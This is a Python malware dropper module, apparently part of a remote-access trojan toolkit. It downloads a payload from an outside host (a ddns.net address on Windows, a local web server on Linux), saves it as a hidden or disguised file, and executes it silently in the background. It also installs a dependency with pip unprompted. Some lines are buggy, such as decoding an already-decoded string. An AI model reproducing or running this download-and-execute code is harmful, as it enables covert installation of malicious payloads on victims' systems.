############ *_* TO note *_* ################
# run: python -m SimpleHTTPServer ###########
# The the directory from which you run that #
# command become the web directory, so move #
# files to that dir.                        #
# To check: firefox http://127.0.0.1:8000   #
#############################################

import base64
import ctypes
import os
import time

#TODO. Check if we have python27 or python3 run this script to know which module to import !!
try:
  import urllib3
except:
  os.system("pip install urllib3>/dev/null")
  time.sleep(5)
  import urllib3

# retrieve the shellcode from our web server
#"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
#TODO: use free FTP server
bin = False
ScriptExec = "python3.5 "
url = "http://127.0.0.1:8000/TCP_client.py"
OsTargetpath = ".payload_posix"
shellcode = ""
start = True #To decide entweder an oder aus die Zugriff

def run(**args):
  #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
  print('[*] In getFileFromURI module.')
  global bin, url, ScriptExec, OsTargetpath, shellcode
  if os.name == 'nt':
      bin = True
      url = "http://saw-dsr.ddns.net:8000/test"
      OsTargetpath = "payload_win32.exe"
  elif os.name == 'posix':
      bin = False
      ScriptExec = "python3.5 "
      #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
      OsTargetpath = ".payload_posix"
  else:
      return "[ERROR] getFileFromURI: Not recognised OS!"

  try:
    http = urllib3.PoolManager()
    #The HTTPResponse object provides status, data, and header attributes:
    r = http.request('GET', url)
    shellcode = r.data.decode('utf-8')
  except urllib3.exceptions.MaxRetryError:
  	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
  	return "getFileFromURI: HTTP Error 404: File not found"
  except urllib3.exceptions.URLError:
  	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
  	return "getFileFromURI: Connection refused"

  #The data attribute of the response is always set to a byte string representing the response content
  cmd = ""
  if bin:
    mon_fichier = open(OsTargetpath, "wb")
    mon_fichier.write(shellcode)
    mon_fichier.close()
    cmd= "./{}".format(OsTargetpath)
  else:
    print(shellcode)
    mon_fichier = open(OsTargetpath, "w")
    mon_fichier.write(shellcode.decode())
    mon_fichier.close()
    cmd= ScriptExec+" "+OsTargetpath

  print(cmd)
  if start and os.name == 'nt': #TODO: check how to start python script
          os.system("start {}".format(cmd)) #os.system("start {}".format(OsTargetpath))
  elif start and os.name == 'posix':
          os.system("chmod 755 {}".format(OsTargetpath))
          os.system(cmd +">/dev/null &")
  else:
          return ("Script is Stored under {} but never started".format(OsTargetpath))

  time.sleep(5)
  return str("getFileFromURI: file {} successfully started".format(OsTargetpath))


run()
  #while not is_connected(): #if the tro execute this, so it is already connected
  #time.sleep(20)
import socket
REMOTE_SERVER = "www.google.com"
def is_connected(hostname):
  try:
    # see if we can resolve the host name: if there is a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host: if the host is actually reachable
    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False
